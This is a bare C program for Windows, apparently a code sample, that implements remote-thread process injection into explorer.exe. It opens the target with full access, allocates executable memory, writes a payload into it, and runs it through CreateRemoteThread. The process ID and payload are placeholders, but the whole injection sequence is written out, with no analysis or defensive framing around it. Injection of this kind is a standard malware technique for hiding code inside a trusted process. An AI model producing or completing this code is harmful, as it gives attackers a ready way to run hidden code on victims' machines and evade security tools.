#include <windows.h>\n\nint main() {\n    // 1. Obtain a handle to the target process (explorer.exe)\n    DWORD pid = /* Process ID of explorer.exe */;\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n\n    // 2. Allocate memory in the target process\n    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n    // 3. Write the payload into the allocated memory\n    WriteProcessMemory(hProcess, pRemoteMemory, payload, payloadSize, NULL);\n\n    // 4. Create a remote thread in the target process\n    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);\n\n    // 5. Wait for the remote thread to finish\n    WaitForSingleObject(hThread, INFINITE);\n\n    // 6. Clean up\n    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n\n    return 0;\n}